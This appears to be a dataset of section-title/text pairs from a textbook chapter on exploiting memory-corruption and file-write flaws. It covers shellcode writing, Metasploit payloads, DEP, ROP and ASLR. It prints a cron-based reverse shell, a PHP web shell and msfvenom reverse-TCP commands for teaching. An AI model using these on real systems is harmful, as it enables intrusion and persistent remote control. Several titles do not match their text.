    "output": "Heap Memory Storage\nThe final topic to discuss in relation to heap implementations is how infor-\nmation like the free-list is stored in memory. There are two methods. In one\nmethod, metadata, such as block size and whether the state is free or allo-\ncated, is stored alongside the allocated memory, which is known as in-band.\nIn the other, known as out-of-band, metadata is stored elsewhere in memory.\nThe out-of-band method is in many ways easier to exploit because you don’t\nhave to worry about restoring important metadata when corrupting con-\ntiguous memory blocks, and it’s especially useful when you don’t know what\nvalues to restore for the metadata to be valid.\nArbitrary Memory Write Vulnerability\nMemory corruption vulnerabilities are often the easiest vulnerabilities\nto find through fuzzing, but they’re not the only kind, as mentioned in\nChapter 9. The most interesting is an arbitrary file write resulting from\nincorrect resource handling. This incorrect handling of resources might\nbe due to a command that allows you to directly specify the location of a\nfile write or due to a command that has a path canonicalization vulner-\nability, allowing you to specify the location relative to the current directory.\nHowever the vulnerability manifests, it’s useful to know what you would\nneed to write to the filesystem to get code execution.\nThe arbitrary writing of memory, although it might be a direct conse-\nquence of a mistake in the application’s implementation, could also occur\nas a by-product of another vulnerability, such as a heap buffer overflow.\nMany old heap memory allocators would use a linked list structure to store\nthe list of free blocks; if this linked list data were corrupted, any modifi-\ncation of the free-list could result in an arbitrary write of a value into an\nattacker-supplied location.\nTo exploit an arbitrary memory write vulnerability, you need to\nmodify a location that can directly control execution. For example, you\ncould target the VTable pointer of an object in memory and overwrite it\nto gain control over execution, as in the methods for other corruption\nvulnerabilities.\nOne advantage of an arbitrary write is that it can lead to subverting\nthe logic of an application. As an example, consider the networked appli-\ncation shown in Listing 107. Its logic creates a memory structure to store\nimportant information about a connection, such as the network socket\nused and whether the user was authenticated as an administrator, when\nthe connection is created.\nstruct Session {\nint socket;\nint is_admin;\n};\nSession* session = WaitForConnection();\nListing 10-7: A simple connection session structure\nFinding and Exploiting Security Vulnerabilities 253\nFor this example, we’ll assume that some code checks, whether or\nnot the session is an administrator session, will allow only certain tasks to\nbe done, such as changing the system’s configuration. There is a direct\ncommand to execute a local shell command if you’re authenticated as an\nadministrator in the session, as shown in Listing 10-8.\nCommand c = ReadCommand(session->socket);\nif (c.command == CMD_RUN_COMMAND\n&& session->is_admin) {\nsystem(c->data);\n}\nListing 10-8: Opening the run command as an administrator\nBy discovering the location of the session object in memory, you can\nchange the is_admin value from 0 to 1, opening the run command for the\nattacker to gain control over the target system. We could also change the\nsocket value to point to another file, causing the application to write data\nto an arbitrary file when writing a response, because in most Unix-like plat-\nforms, file descriptors and sockets are effectively the same type of resource.\nYou can use the write system call to write to a file, just as you can to write to\nthe socket.\nAlthough this is a contrived example, it should help you understand what\nhappens in real-world networked applications. For any application that uses\nsome sort of authentication to separate user and administrator responsibili-\nties, you could typically subvert the security system in this way.\nExploiting High-Privileged File Writes\nIf an application is running with elevated privileges, such as root or admin-\nistrator privileges, your options for exploiting an arbitrary file write are\nexpansive. One technique is to overwrite executables or libraries that you\nknow will get executed, such as the executable running the network service\nyou’re exploiting. Many platforms provide other means of executing code,\nsuch as scheduled tasks, or cron jobs on Linux.\nIf you have high privileges, you can write your own cron jobs to a direc-\ntory and execute them. On modern Linux systems, there’s usually a num-\nber of cron directories already inside /etc that you can write to, each with\na suffix that indicates when the jobs will be executed. However, writing to\nthese directories requires you to give the script file executable permissions.\nIf your arbitrary file write only provides read and write permissions, you’ll\nneed to write to /etc/cron.d with a Crontab file to execute arbitrary system\ncommands. Listing 10-9 shows an example of a simple Crontab file that will\nrun once a minute and connect a shell process to an arbitrary host and TCP\nport where you can access system commands.\n* * * * * root /bin/bash -c '/bin/bash -i >& /dev/tcp/127.0.0.1/1234 0>&1'\nListing 10-9: A simple reverse shell Crontab file\n254 Chapter 10"
  },
  {
    "input": "Writing Shell Code",
    "output": "This Crontab file must be written to /etc/cron.d/run_shell. Note that some\nversions of bash don’t support this reverse shell syntax, so you would have to\nuse something else, such as a Python script, to achieve the same result. Now\nlet’s look at how to exploit write vulnerabilities with low-privileged file writes.\nExploiting Low-Privileged File Writes\nIf you don’t have high privileges when a write occurs, all is not lost; however,\nyour options are more limited, and you’ll still need to understand what is\navailable on the system to exploit. For example, if you’re trying to exploit a\nweb application or there’s a web server install on the machine, it might be\npossible to drop a server-side rendered web page, which you can then access\nthrough a web server. Many web servers will also have PHP installed, which\nallows you to execute commands as the web server user and return the result\nof that command by writing the file shown in Listing 10-10 to the web root\n(it might be in /var/www/html or one of many other locations) with a .php\nextension.\n<?php\nif (isset($_REQUEST['exec'])) {\n$exec = $_REQUEST['exec'];\n$result = system($exec);\necho $result;\n}\n?>\nListing 10-10: A simple PHP shell\nAfter you’ve dropped this PHP shell to the web root, you can execute\narbitrary commands on the system in the context of the web server by\nrequesting a URL in the form http://server/shell.php?exec=CMD. The URL\nwill result in the PHP code being executed on the server: the PHP shell will\nextract the exec parameter from the URL and pass it to the system API, with\nthe result of executing the arbitrary command CMD.\nAnother advantage of PHP is that it doesn’t matter what else is in the\nfile when it’s written: the PHP parser will look for the <?php … ?> tags and\nexecute any PHP code within those tags regardless of whatever else is in\nthe file. This is useful when you don’t have full control over what’s written\nto a file during the vulnerability exploitation.\nwriting shell code\nNow let’s look at how to start writing your own shell code. Using this shell\ncode, you can execute arbitrary commands within the context of the applica-\ntion you’re exploiting with your discovered memory corruption vulnerability.\nWriting your own shell code can be complex, and although I can’t do it\nfull justice in the remainder of this chapter, I’ll give you some examples you\nFinding and Exploiting Security Vulnerabilities 255"
  },
  {
    "input": "Getting Started",
    "output": "can build on as you continue your own research into the subject. I’ll start\nwith some basic techniques and challenges of writing x64 code using the\nLinux platform.\nGetting Started\nTo start writing shell code, you need the following:\n• An installation of Linux x64.\n• A compiler; both GCC and CLANG are suitable.\n• A copy of the Netwide Assembler (NASM); most Linux distributions have a\npackage available for this.\nOn Debian and Ubuntu, the following command should install every-\nthing you need:\nsudo apt-get install build-essential nasm\nWe’ll write the shell code in x64 assembly language and assemble it using\nnasm, a binary assembler. Assembling your shell code should result in a binary\nfile containing just the machine instructions you specified. To test your shell\ncode, you can use Listing 10-11, written in C, to act as a test harness.\ntest_shellcode.c #include <fcntl.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <sys/mman.h>\n#include <sys/stat.h>\n#include <unistd.h>\ntypedef int (*exec_code_t)(void);\nint main(int argc, char** argv) {\nif (argc < 2) {\nprintf(\"Usage: test_shellcode shellcode.bin\\n\");\nexit(1);\n}\n int fd = open(argv[1], O_RDONLY);\nif (fd <= 0) {\nperror(\"open\");\nexit(1);\n}\nstruct stat st;\nif (fstat(fd, &st) == -1) {\nperror(\"stat\");\nexit(1);\n}\n exec_code_t shell = mmap(NULL, st.st_size,\n PROT_EXEC | PROT_READ, MAP_PRIVATE, fd, 0);\n256 Chapter 10\nif (shell == MAP_FAILED) {\nperror(\"mmap\");\nexit(1);\n}\nprintf(\"Mapped Address: %p\\n\", shell);\nprintf(\"Shell Result: %d\\n\", shell());\nreturn 0;\n}\nListing 10-11: A shell code test harness\nThe code takes a path from the command line  and then maps it into\nmemory as a memory-mapped file . We specify that the code is executable\nwith the PROT_EXEC flag ; otherwise, various platform-level exploit mitiga-\ntions could potentially stop the shell code from executing.\nCompile the test code using the installed C compiler by executing the\nfollowing command at the shell. You shouldn’t see any warnings during\ncompilation.\n$ cc –Wall –o test_shellcode test_shellcode.c\nTo test the code, put the following assembly code into the file shellcode\n.asm, as shown in Listing 10-12.\n; Assemble as 64 bit\nBITS 64\nmov rax, 100\nret\nListing 10-12: A simple shell code example\nThe shell code in Listing 10-12 simply moves the value 100 to the RAX\nregister. The RAX register is used as the return value for a function call.\nThe test harness will call this shell code as if it were a function, so we would\nexpect the value of the RAX register to be returned to the test harness. The\nshell code then immediately issues the ret instruction, jumping back to the\ncaller of the shell code, which in this case is our test harness. The test harness\nshould then print out the return value of 100, if successful.\nLet’s try it out. First, we’ll need to assemble the shell code using nasm, and\nthen we’ll execute it in the harness:\n$ nasm -f bin -o shellcode.bin shellcode.asm\n$ ./test_shellcode shellcode.bin\nMapped Address: 0x7fa51e860000\nShell Result: 100\nThe output returns 100 to the test harness, verifying that we’re success-\nfully loading and executing the shell code. It’s also worth verifying that the\nassembled code in the resulting binary matches what we would expect. We\ncan check this with the companion ndisasm tool, which disassembles this\nFinding and Exploiting Security Vulnerabilities 257"
  },
  {
    "input": "Simple Debugging Technique",
    "output": "simple binary file without having to use a disassembler, such as IDA Pro.\nWe need to use the -b 64 switch to ensure ndisasm uses 64-bit disassembly, as\nshown here:\n$ ndisasm -b 64 shellcofe.bin\n00000000 B864000000 mov eax,0x64\n00000005 C3 ret\nThe output from ndisasm should match up with the instructions we speci-\nfied in the original shell code file in Listing 10-12. Notice that we used the\nRAX register in the mov instruction, but in the disassembler output we find\nthe EAX register. The assembler uses this 32-bit register rather than a 64-bit\nregister because it realizes that the constant 0x64 fits into a 32-bit constant, so\nit can use a shorter instruction rather than loading an entire 64-bit constant.\nThis doesn’t change the behavior of the code because, when loading the\nconstant into EAX, the processor will automatically set the upper 32 bits of\nthe RAX register to zero. The BITS directive is also missing, because that is a\ndirective for the nasm assembler to enable 64-bit support and is not needed in\nthe final assembled output.\nSimple Debugging Technique\nBefore you start writing more complicated shell code, let’s examine an\neasy debugging method. This is important when testing your full exploit,\nbecause it might not be easy to stop execution of the shell code at the exact\nlocation you want. We’ll add a breakpoint to our shell code using the int3\ninstruction so that when the associated code is called, any attached debug-\nger will be notified.\nModify the code in Listing 10-12 as shown in Listing 10-13 to add the\nint3 breakpoint instruction and then rerun the nasm assembler.\n# Assemble as 64 bit\nBITS 64\nint3\nmov rax, 100\nret\nListing 10-13: A simple shell code example with a breakpoint\nIf you execute the test harness in a debugger, such as GDB, the output\nshould be similar to Listing 10-14.\n$ gdb --args ./test_shellcode shellcode.bin\nGNU gdb 7.7.1\n...\n(gdb) display/1i $rip\n(gdb) r\nStarting program: /home/user/test_shellcode debug_break.bin\nMapped Address: 0x7fb6584f3000\n Program received signal SIGTRAP, Trace/breakpoint trap.\n258 Chapter 10"
  },
  {
    "input": "Calling System Calls",
    "output": "0x00007fb6584f3001 in ?? ()\n1: x/i $rip\n => 0x7fb6584f3001: mov $0x64,%eax\n(gdb) stepi\n0x00007fb6584f3006 in ?? ()\n1: x/i $rip\n=> 0x7fb6584f3006: retq\n(gdb)\n0x00000000004007f6 in main ()\n1: x/i $rip\n=> 0x4007f6 <main+281>: mov %eax,%esi\nListing 10-14: Setting a breakpoint on a shell\nWhen we execute the test harness, the debugger stops on a SIGTRAP sig-\nnal . The reason is that the processor has executed the int3 instruction,\nwhich acts as a breakpoint, resulting in the OS sending the SIGTRAP signal\nto the process that the debugger handles. Notice that when we print the\ninstruction the program is currently running , it’s not the int3 instruc-\ntion but instead the mov instruction immediately afterward. We don’t see\nthe int3 instruction because the debugger has automatically skipped over\nit to allow the execution to continue.\nCalling System Calls\nThe example shell code in Listing 10-12 only returns the value 100 to the\ncaller, in this case our test harness, which is not very useful for exploiting a\nvulnerability; for that, we need the system to do some work for us. The easi-\nest way to do that in shell code is to use the OS’s system calls. A system call is\nspecified using a system call number defined by the OS. It allows you to call\nbasic system functions, such as opening files and executing new processes.\nUsing system calls is easier than calling into system libraries because\nyou don’t need to know the memory location of other executable code, such\nas the system C library. Not needing to know library locations makes your\nshell code simpler to write and more portable across different versions of\nthe same OS.\nHowever, there are downsides to using system calls: they generally imple-\nment much lower-level functionality than the system libraries, making them\nmore complicated to call, as you’ll see. This is especially true on Windows,\nwhich has very complicated system calls. But for our purposes, a system call\nwill be sufficient for demonstrating how to write your own shell code.\nSystem calls have their own defined application binary interface (ABI)\n(see “Application Binary Interface” on page 123 for more details). In x64\nLinux, you execute a system call using the following ABI:\n• The number of the system call is placed in the RAX register.\n• Up to six arguments can be passed into the system call in the registers\nRDI, RSI, RDX, R10, R8 and R9.\nFinding and Exploiting Security Vulnerabilities 259\n• The system call is issued using the syscall instruction.\n• The result of the system call is stored in RAX after the syscall instruc-\ntion returns.\nFor more information about the Linux system call process, run man 2\nsyscall on a Linux command line. This page contains a manual that\ndescribes the system call process and defines the ABI for various differ-\nent architectures, including x86 and ARM. In addition, man 2 syscalls lists\nall the available system calls. You can also read the individual pages for a\nsystem call by running man 2 <SYSTEM CALL NAME>.\nThe exit System Call\nTo use a system call, we first need the system call number. Let’s use the exit\nsystem call as an example.\nHow do we find the number for a particular system call? Linux comes\nwith header files, which define all the system call numbers for the current\nplatform, but trying to find the right header file on disk can be like chasing\nyour own tail. Instead, we’ll let the C compiler do the work for us. Compile\nthe C code in Listing 10-15 and execute it to print the system call number\nof the exit system call.\n#include <stdio.h>\n#include <sys/syscall.h>\nint main() {\nprintf(\"Syscall: %d\\n\", SYS_exit);\nreturn 0;\n}\nListing 10-15: Getting the system call number\nOn my system, the system call number for exit is 60, which is printed to\nmy screen; yours may be different depending on the version of the Linux\nkernel you’re using, although the numbers don’t change very often. The exit\nsystem call specifically takes process exit code as a single argument to return\nto the OS and indicate why the process exited. Therefore, we need to pass\nthe number we want to use for the process exit code into RDI. The Linux ABI\nspecifies that the first parameter to a system call is specified in the RDI regis-\nter. The exit system call doesn’t return anything from the kernel; instead, the\nprocess (the shell) is immediately terminated. Let’s implement the exit call.\nAssemble Listing 10-16 with nasm and run it inside the test harness.\nBITS 64\n; The syscall number of exit\nmov rax, 60\n; The exit code argument\nmov rdi, 42\nsyscall\n260 Chapter 10\n; exit should never return, but just in case.\nret\nListing 10-16: Calling the exit system call in shell code\nNotice that the first print statement in Listing 10-16, which shows where\nthe shell code was loaded, is still printed, but the subsequent print statement\nfor the return of the shell code is not. This indicates the shell code has suc-\ncessfully called the exit system call. To double-check this, you can display the\nexit code from the test harness in your shell, for example, by using echo $?\nin bash. The exit code should be 42, which is what we passed in the mov rdi\nargument.\nThe write System Call\nNow let’s try calling write, a slightly more complicated system call that writes\ndata to a file. Use the following syntax for the write system call:\nssize_t write(int fd, const void *buf, size_t count);\nThe fd argument is the file descriptor to write to. It holds an integer\nvalue that describes which file you want to access. Then you declare the\ndata to be written by pointing the buffer to the location of the data. You\ncan specify how many bytes to write using count.\nUsing the code in Listing 10-17, we’ll pass the value 1 to the fd argu-\nment, which is the standard output for the console.\nBITS 64\n%define SYS_write 1\n%define STDOUT 1\n_start:\nmov rax, SYS_write\n; The first argument (rdi) is the STDOUT file descriptor\nmov rdi, STDOUT\n; The second argument (rsi) is a pointer to a string\nlea rsi, [_greeting]\n; The third argument (rdx) is the length of the string to write\nmov rdx, _greeting_end - _greeting\n; Execute the write system call\nsyscall\nret\n_greeting:\ndb \"Hello User!\", 10\n_greeting_end:\nListing 10-17: Calling the write system call in shell code\nBy writing to standard output, we’ll print the data specified in buf\nto the console so we can see whether it worked. If successful, the string\nFinding and Exploiting Security Vulnerabilities 261\nHello User! should be printed to the shell console that the test harness is\nrunning on. The write system call should also return the number of bytes\nwritten to the file.\nNow assemble Listing 10-17 with nasm and execute the binary in the test\nharness:\n$ nasm -f bin -o shellcode.bin shellcode.asm\n$ ./test_shellcode shellcode.bin\nMapped Address: 0x7f165ce1f000\nShell Result: -14\nInstead of printing the Hello User! greeting we were expecting, we get a\nstrange result, -14. Any value returning from the write system call that’s less\nthan zero indicates an error. On Unix-like systems, including Linux, there’s\na set of defined error numbers (abbreviated as errno). The error code is\ndefined as positive in the system but returns as negative to indicate that it’s\nan error condition. You can look up the error code in the system C header\nfiles, but the short Python script in Listing 10-18 will do the work for us.\nimport os\n# Specify the positive error number\nerr = 14\nprint os.errno.errorcode[err]\n# Prints 'EFAULT'\nprint os.strerror(err)\n# Prints 'Bad address'\nListing 10-18: A simple Python script to print error codes\nRunning the script will print the error code name as EFAULT and the string\ndescription as Bad address. This error code indicates that the system call tried\nto access some memory that was invalid, resulting in a memory fault. The\nonly memory address we’re passing is the pointer to the greeting. Let’s look\nat the disassembly to find out whether the pointer we’re passing is at fault:\n00000000 B801000000 mov rax,0x1\n00000005 BF01000000 mov rdi,0x1\n0000000A 488D34251A000000 lea rsi,[0x1a]\n00000012 BA0C000000 mov rdx,0xc\n00000017 0F05 syscall\n00000019 C3 ret\n0000001A db \"Hello User!\", 10\nNow we can see the problem with our code: the lea instruction, which\nloads the address to the greeting, is loading the absolute address 0x1A.\nBut if you look at the test harness executions we’ve done so far, the address\nat which we load the executable code isn’t at 0x1A or anywhere close to it.\nThis mismatch between the location where the shell code loads and the\nabsolute addresses causes a problem. We can’t always determine in advance\n262 Chapter 10"
  },
  {
    "input": "Executing the Other Programs",
    "output": "where the shell code will be loaded in memory, so we need a way of refer-\nencing the greeting relative to the current executing location. Let’s look at\nhow to do this on 32-bit and 64-bit x86 processors.\nAccessing the Relative Address on 32- and 64-Bit Systems\nIn 32-bit x86 mode, the simplest way of getting a relative address is to take\nadvantage of the fact that the call instruction works with relative addresses.\nWhen a call instruction executes, it pushes the absolute address of the subse-\nquent instruction onto the stack as a return address. We can use this absolute\nreturn address value to calculate where the current shell code is executing\nfrom and adjust the memory address of the greeting to match. For example,\nreplace the lea instruction in Listing 10-17 with the following code:\ncall _get_rip\n_get_rip:\n; Pop return address off the stack\npop rsi\n; Add relative offset from return to greeting\nadd rsi, _greeting - _get_rip\nUsing a relative call works well, but it massively complicates the code.\nFortunately, the 64-bit instruction set introduced relative data addressing.\nWe can access this in nasm by adding the rel keyword in front of an address.\nBy changing the lea instruction as follows, we can access the address of the\ngreeting relative to the current executing instruction:\nlea rsi, [rel _greeting]\nNow we can reassemble our shell code with these changes, and the mes-\nsage should print successfully:\n$ nasm -f bin -o shellcode.bin shellcode.asm\n$ ./test_shellcode shellcode.bin\nMapped Address: 0x7f165dedf000\nHello User!\nShell Result: 12\nExecuting the Other Programs\nLet’s wrap up our overview of system calls by executing another binary using\nthe execve system call. Executing another binary is a common technique for\ngetting execution on a target system that doesn’t require long, complicated\nshell code. The execve system call takes three parameters: the path to the pro-\ngram to run, an array of command line arguments with the array terminated\nby NULL, and an array of environment variables terminated by NULL. Calling\nexecve requires a bit more work than calling simple system calls, such as write,\nbecause we need to build the arrays on the stack; however, it’s not that hard.\nListing 10-19 executes the uname command by passing it the -a argument.\nFinding and Exploiting Security Vulnerabilities 263\nexecve.asm BITS 64\n%define SYS_execve 59\n_start:\nmov rax, SYS_execve\n; Load the executable path\n lea rdi, [rel _exec_path]\n; Load the argument\nlea rsi, [rel _argument]\n; Build argument array on stack = { _exec_path, _argument, NULL }\n push 0\npush rsi\npush rdi\n mov rsi, rsp\n; Build environment array on stack = { NULL }\npush 0\nx mov rdx, rsp\ny syscall\n; execve shouldn't return, but just in case\nret\n_exec_path:\ndb \"/bin/uname\", 0\n_argument:\ndb \"-a\", 0\nListing 10-19: Executing an arbitrary executable in shell code\nThe shellcode in Listing 10-19 is complex, so let’s break it down step-\nby-step. First, the addresses of two strings, \"/bin/uname\" and \"-a\", are loaded\ninto registers . The addresses of the two strings with the final NUL (which\nis represented by a 0) are then pushed onto the stack in reverse order .\nThe code copies the current address of the stack to the RSI register, which\nis the second argument to the system call . Next, a single NUL is pushed\non the stack for the environment array, and the address on the stack is cop-\nied to the RDX register x, which is the third argument to the system call.\nThe RDI register already contains the address of the \"/bin/uname\" string so\nour shell code does not need to reload the address before calling the system\ncall. Finally, we execute the execve system call y, which executes the shell\nequivalent of the following C code:\nchar* args[] = { \"/bin/uname\", \"-a\", NULL };\nchar* envp[] = { NULL };\nexecve(\"/bin/uname\", args, envp);\nIf you assemble the execve shell code, you should see output similar to\nthe following, where command line /bin/uname -a is executed:\n$ nasm -f bin -o execve.bin execve.asm\n$ ./test_shellcode execv.bin\n264 Chapter 10"
  },
  {
    "input": "Generating Shell Code with Metasploit",
    "output": "Mapped Address: 0x7fbdc3c1e000\nLinux foobar 4.4.0 Wed Dec 31 14:42:53 PST 2014 x86_64 x86_64 x86_64 GNU/Linux\nGenerating Shell Code with Metasploit\nIt’s worth practicing writing your own shell code to gain a deeper under-\nstanding of it. However, because people have been writing shell code for a\nlong time, a wide range of shell code to use for different platforms and pur-\nposes is already available online.\nThe Metasploit project is one useful repository of shell code. Metasploit\ngives you the option of generating shell code as a binary blob, which you can\neasily plug into your own exploit. Using Metasploit has many advantages:\n• Handling encoding of the shell code by removing banned characters or\nformatting to avoid detection\n• Supporting many different methods of gaining execution, including\nsimple reverse shell and executing new binaries\n• Supporting multiple platforms (including Linux, Windows, and macOS)\nas well as multiple architectures (such as x86, x64, and ARM)\nI won’t explain in great detail how to build Metasploit modules or use\ntheir staged shell code, which requires the use of the Metasploit console to\ninteract with the target. Instead, I’ll use a simple example of a reverse TCP\nshell to show you how to generate shell code using Metasploit. (Recall that\na reverse TCP shell allows the target machine to communicate with the\nattacker’s machine via a listening port, which the attacker can use to gain\nexecution.)\nAccessing Metasploit Payloads\nThe msfvenom command line utility comes with a Metasploit installa-\ntion, which provides access to the various shell code payloads built into\nMetasploit. We can list the payloads supported for x64 Linux using the -l\noption and filtering the output:\n# msfvenom -l | grep linux/x64\n--snip--\nlinux/x64/shell_bind_tcp Listen for a connection and spawn a command shell\nlinux/x64/shell_reverse_tcp Connect back to attacker and spawn a command shell\nWe’ll use two shell codes:\nshell_bind_tcp Binds to a TCP port and opens a local shell when con-\nnected to it\nshell_reverse_tcp Attempts to connect back to your machine with a\nshell attached\nBoth of these payloads should work with a simple tool, such as Netcat,\nby either connecting to the target system or listening on the local system.\nFinding and Exploiting Security Vulnerabilities 265"
  },
  {
    "input": "Memory Corruption Exploit Mitigations",
    "output": "Building a Reverse Shell\nWhen generating the shell code, you must specify the listening port (for\nbind and reverse shell) and the listening IP (for reverse shell, this is your\nmachine’s IP address). These options are specified by passing LPORT=port\nand LHOST=IP, respectively. We’ll use the following code to build a reverse\nTCP shell, which will connect to the host 172.21.21.1 on TCP port 4444:\n# msfvenom -p linux/x64/shell_reverse_tcp -f raw LHOST=172.21.21.1\\\nLPORT=4444 > msf_shellcode.bin\nThe msfvenom tool outputs the shell code to standard output by default, so\nyou’ll need to pipe it to a file; otherwise, it will just print to the console and\nbe lost. We also need to specify the -f raw flag to output the shell code as a\nraw binary blob. There are other potential options as well. For example, you\ncan output the shell code to a small .elf executable, which you can run directly\nfor testing. Because we have a test harness, we won’t need to do that.\nExecuting the Payload\nTo execute the payload, we need to set up a listening instance of netcat listen-\ning on port 4444 (for example, nc -l 4444). It’s possible that you won’t see\na prompt when the connection is made. However, typing the id command\nshould echo back the result:\n$ nc -l 4444\n# Wait for connection\nid\nuid=1000(user) gid=1000(user) groups=1000(user)\nThe result shows that the shell successfully executed the id command\non the system the shell code is running on and printed the user and group\nIDs from the system. You can use a similar payload on Windows, macOS,\nand even Solaris. It might be worthwhile to explore the various options\nin msfvenom on your own.\nMemory corruption exploit Mitigations\nIn “Exploiting Memory Corruption Vulnerabilities” on page 246, I alluded\nto exploit mitigations and how they make exploiting memory vulnerabilities\ndifficult. The truth is that exploiting a memory corruption vulnerability on\nmost modern platforms can be quite complicated due to exploit mitigations\nadded to the compilers (and the generated application) as well as to the OS.\nSecurity vulnerabilities seem to be an inevitable part of software devel-\nopment, as do significant chunks of source code written in memory-unsafe\nlanguages that are not updated for long periods of time. Therefore, it’s\nunlikely that memory corruption vulnerabilities will disappear overnight.\n266 Chapter 10"
  },
  {
    "input": "Data Execution Prevention",
    "output": "Instead of trying to fix all these vulnerabilities, developers have imple-\nmented clever techniques to mitigate the impact of known security weak-\nnesses. Specifically, these techniques aim to make exploitation of memory\ncorruption vulnerabilities difficult or, ideally, impossible. In this section, I’ll\ndescribe some of the exploit mitigation techniques used in contemporary\nplatforms and development tools that make it more difficult for attackers to\nexploit these vulnerabilities.\nData Execution Prevention\nAs you saw earlier, one of the main aims when developing an exploit is\nto gain control of the instruction pointer. In my previous explanation, I\nglossed over problems that might occur when placing your shell code in\nmemory and executing it. On modern platforms, you’re unlikely to be able\nto execute arbitrary shell code as easily as described earlier due to Data\nExecution Prevention (DEP) or No-Execute (NX) mitigation.\nDEP attempts to mitigate memory corruption exploitation by requiring\nmemory with executable instructions to be specially allocated by the OS. This\nrequires processor support so that if the process tries to execute memory at\nan address that’s not marked as executable, the processor raises an error. The\nOS then terminates the process in error to prevent further execution.\nThe error resulting from executing nonexecutable memory can be\nhard to spot and look confusing at first. Almost all platforms misreport the\nerror as Segmentation fault or Access violation on what looks like potentially\nlegitimate code. You might mistake this error for the instruction’s attempt\nto access invalid memory. Due to this confusion, you might spend time\ndebugging your code to figure out why your shell code isn’t executing cor-\nrectly, believing it to be a bug in your code when it’s actually DEP being\ntriggered. For example, Listing 10-20 shows an example of a DEP crash.\nGNU gdb 7.7.1\n(gdb) r\nStarting program: /home/user/triage/dep\nProgram received signal SIGSEGV, Segmentation fault.\n0xbffff730 in ?? ()\n(gdb) x/3i $pc\n=> 0xbffff730: push $0x2a\n0xbffff732: pop %eax\n0xbffff733: ret\nListing 10-20: An example crash from executing nonexecutable memory\nIt’s tricky to determine the source of this crash. At first glance, you might\nthink it’s due to an invalid stack pointer, because the push instruction at \nwould result in the same error. Only by looking at where the instruction is\nFinding and Exploiting Security Vulnerabilities 267"
  },
  {
    "input": "Return-Oriented Programming Counter-Exploit",
    "output": "located can you discover it was executing nonexecutable memory. You can\ndetermine whether it’s in executable memory by using the memory map com-\nmands described in Table 10-8.\nDEP is very effective in many cases at preventing easy exploitation of\nmemory corruption vulnerabilities, because it’s easy for a platform developer\nto limit executable memory to specific executable modules, leaving areas like\nthe heap or stack nonexecutable. However, limiting executable memory in\nthis way does require hardware and software support, leaving software vul-\nnerable due to human error. For example, when exploiting a simple network-\nconnected device, it might be that the developers haven’t bothered to enable\nDEP or that the hardware they’re using doesn’t support it.\nIf DEP is enabled, you can use the return-oriented programming method\nas a workaround.\nReturn-Oriented Programming Counter-Exploit\nThe development of the return-oriented programming (ROP) technique was in\ndirect response to the increase in platforms equipped with DEP. ROP is a\nsimple technique that repurposes existing, already executable instructions\nrather than injecting arbitrary instructions into memory and executing\nthem. Let’s look at a simple example of a stack memory corruption exploit\nusing this technique.\nOn Unix-like platforms, the C library, which provides the basic API for\napplications such as opening files, also has functions that allow you to start\na new process by passing the command line in program code. The system()\nfunction is such a function and has the following syntax:\nint system(const char *command);\nThe function takes a simple command string, which represents the\nprogram to run and the command line arguments. This command string\nis passed to the command interpreter, which we’ll come back to later. For\nnow, know that if you write the following in a C application, it executes the\nls application in the shell:\nsystem(\"ls\");\nIf we know the address of the system API in memory, we can redirect the\ninstruction pointer to the start of the API’s instructions; in addition, if we\ncan influence the parameter in memory, we can start a new process under\nour control. Calling the system API allows you to bypass DEP because, as far\nas the processor and platform are concerned, you’re executing legitimate\ninstructions in memory marked as executable. Figure 10-8 shows this pro-\ncess in more detail.\nIn this very simple visualization, ROP executes a function provided\nby the C library (libc) to bypass DEP. This technique, specifically called\n268 Chapter 10\nRet2Libc, laid the foundation of ROP as we know it today. You can generalize\nthis technique to write almost any program using ROP, for example, to imple-\nment a full Turing complete system entirely by manipulating the stack.\nMore calls ...\nFunc:\nInteger 0 ret\nExecute system (\"1s\")\nReturn: exit func ...\nsystem:\nAddress of \"1s\" string ...\nret\nReturn: system func\nExecute exit(0)\n...\nCurrent stack exit:\nsyscall\nFinding and Exploiting Security Vulnerabilities 269\nnoitcerid\npop\nkcatS\nFigure 10-8: A simple ROP to call the system API\nThe key to understanding ROP is to know that a sequence of instruc-\ntions doesn’t have to execute as it was originally compiled into the program’s\nexecutable code. This means you can take small snippets of code throughout\nthe program or in other executable code, such as libraries, and repurpose\nthem to perform actions the developers didn’t originally intend to execute.\nThese small sequences of instructions that perform some useful function\nare called ROP gadgets. Figure 10-9 shows a more complex ROP example that\nopens a file and then writes a data buffer to the file.\nLength of data\nPointer to data\nReturn: GADGET3\n...\nGADGET1:\n0x10 byte space pop edi\npop esi\nReturn: GADGET2 pop ecx ...\nret GADGET2:\nAddress of open push edi\npush esi\nO_WRONLY call ecx\nadd esp, 0x10 ...\nPointer to \"/tmp/myfile\" ret GADGET3:\nopen(\"/tmp/myfile\", O_WRONLY) push eax\nLower stack frame call write\nwrite(fd, &data, length) ret\nnoitcerid\npop\nkcatS\nFigure 10-9: A more complex ROP calling open and then writing to the file by using a\ncouple of gadgets\nBecause the value of the file descriptor returning from open probably\ncan’t be known ahead of time, this task would be more difficult to do using\nthe simpler Ret2Libc technique."
  },
  {
    "input": "Address Space Layout Randomization (ASLR)",
    "output": "Populating the stack with the correct sequence of operations to exe-\ncute as ROP is easy if you have a stack buffer overflow. But what if you only\nhave some other method of gaining the initial code execution, such as a\nheap buffer overflow? In this case, you’ll need a stack pivot, which is a ROP\ngadget that allows you to set the current stack pointer to a known value. For\nexample, if after the exploit EAX points to a memory buffer you control\n(perhaps it’s a VTable pointer), you can gain control over the stack pointer\nand execute your ROP chain using a gadget that looks like Listing 10-21.\nxchg esp, eax # Exchange the EAX and ESP registers\nret # Return, will execute address on new stack\nListing 10-21: Gaining execution using a ROP gadget\nThe gadget shown in Listing 10-21 switches the register value EAX with\nthe value ESP, which indexes the stack in memory. Because we control the\nvalue of EAX, we can pivot the stack location to the set of operations (such\nas in Figure 10-9), which will execute our ROP.\nUnfortunately, using ROP to get around DEP is not without problems.\nLet’s look at some ROP limitations and how to deal with them.\nAddress Space Layout Randomization (ASLR)\nUsing ROP to bypass DEP creates a couple of problems. First, you need to\nknow the location of the system functions or ROP gadgets you’re trying\nto execute. Second, you need to know the location of the stack or other\nmemory locations to use as data. However, finding locations wasn’t always\na limiting factor.\nWhen DEP was first introduced into Windows XP SP2, all system\nbinaries and the main executable file were mapped in consistent loca-\ntions, at least for a given update revision and language. (This is why earlier\nMetasploit modules require you to specify a language). In addition, the\noperation of the heap and the locations of thread stacks were almost com-\npletely predictable. Therefore, on XP SP2 it was easy to circumvent DEP,\nbecause you could guess the location of all the various components you\nmight need 